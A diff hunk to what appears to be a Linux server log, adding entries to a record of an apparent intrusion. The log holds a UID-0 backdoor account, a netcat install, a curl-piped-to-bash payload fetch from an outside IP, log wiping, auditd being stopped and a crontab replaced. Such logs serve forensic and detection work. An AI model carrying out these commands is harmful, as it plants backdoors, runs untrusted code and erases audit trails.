@@ -24,3 +24,5 @@ Oct 14 09:26:03 web01 useradd[2022]: new user: name=svc-update, UID=0, GID=0, ho
 Oct 14 09:26:04 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get install netcat
 Oct 14 09:28:10 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c curl http://45.137.21.134/s.sh | bash
 Oct 14 09:31:02 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s
+Oct 14 09:32:05 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl stop auditd
+Oct 14 09:33:08 web01 crontab[4120]: (deploy) REPLACE (deploy)
